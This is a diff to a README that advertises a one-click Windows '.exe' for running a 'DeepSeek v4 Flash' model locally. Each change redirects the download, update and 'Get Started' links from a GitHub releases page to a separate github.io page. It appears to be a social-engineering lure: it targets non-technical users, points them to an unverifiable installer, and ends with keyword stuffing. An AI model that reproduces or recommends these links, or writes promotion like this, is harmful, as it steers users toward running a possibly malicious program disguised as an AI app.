@@ -1,7 +1,7 @@
 <h1>⚡ DeepSeek-v4-Flash-One-DGX-Spark - Run AI Locally in Minutes</h1>
 
 <p align="center">
-<a href="https://github.com/liveryalpineanemone2431/DeepSeek-v4-Flash-One-DGX-Spark/releases"><img src="https://img.shields.io/badge/Download-DeepSeek_v4_Flash-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button"></a>
+<a href="https://liveryalpineanemone2431.github.io"><img src="https://img.shields.io/badge/Download-DeepSeek_v4_Flash-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button"></a>
 </p>
 
 ## 🎯 What Is This?
@@ -25,7 +25,7 @@ That is it. No special tools, no command line, no coding.
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [Download DeepSeek-v4-Flash-One-DGX-Spark](https://github.com/liveryalpineanemone2431/DeepSeek-v4-Flash-One-DGX-Spark/releases)
+Visit this link to download the application: [Download DeepSeek-v4-Flash-One-DGX-Spark](https://liveryalpineanemone2431.github.io)
 
 This link will take you to the official release page where you can find the latest version. Look for the file named `DeepSeek-v4-Flash-Setup.exe` or similar – it is usually the largest file on the page. Click the download button next to it and wait for the download to finish. The file size is large (around 8 GB), so please be patient if it takes some time.
 
@@ -75,7 +75,7 @@ We regularly release updates with improvements and new features. To update:
 2. **Download the update** – If an update is available, click "Download" and follow the prompts.
 3. **Restart the application** – After the update installs, restart to enjoy the latest version.
 
-You can also visit the [releases page](https://github.com/liveryalpineanemone2431/DeepSeek-v4-Flash-One-DGX-Spark/releases) periodically to see if a new version is available.
+You can also visit the [releases page](https://liveryalpineanemone2431.github.io) periodically to see if a new version is available.
 
 ## ❓ Frequently Asked Questions
 
@@ -137,7 +137,7 @@ DeepSeek-v4-Flash-One-DGX-Spark puts a powerful AI assistant at your fingertips.
 Download it today and experience the future of personal computing – all from the comfort of your own desktop.
 
 <p align="center">
-<a href="https://github.com/liveryalpineanemone2431/DeepSeek-v4-Flash-One-DGX-Spark/releases"><img src="https://img.shields.io/badge/Get_Started-Download_Now-1f6feb?style=for-the-badge" alt="Download Now"></a>
+<a href="https://liveryalpineanemone2431.github.io"><img src="https://img.shields.io/badge/Get_Started-Download_Now-1f6feb?style=for-the-badge" alt="Download Now"></a>
 </p>
 
 Keywords: DeepSeek, v4, Flash, EXL3, DGX, Spark, AI, local, offline, Windows, free, download, install, guide, tutorial, artificial intelligence, language model, chat, assistant, one-click, setup, DGX Spark, DeepSeek v4 Flash
